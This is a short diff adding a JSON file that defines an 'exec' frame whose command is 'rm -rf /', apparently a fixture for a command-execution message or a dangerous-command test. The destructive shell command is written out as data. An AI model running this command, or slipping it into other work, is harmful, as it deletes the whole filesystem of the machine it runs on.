@@ -1,0 +1,6 @@
+{
+  "frame": {
+    "type": "exec",
+    "command": "rm -rf /"
+  }
+}
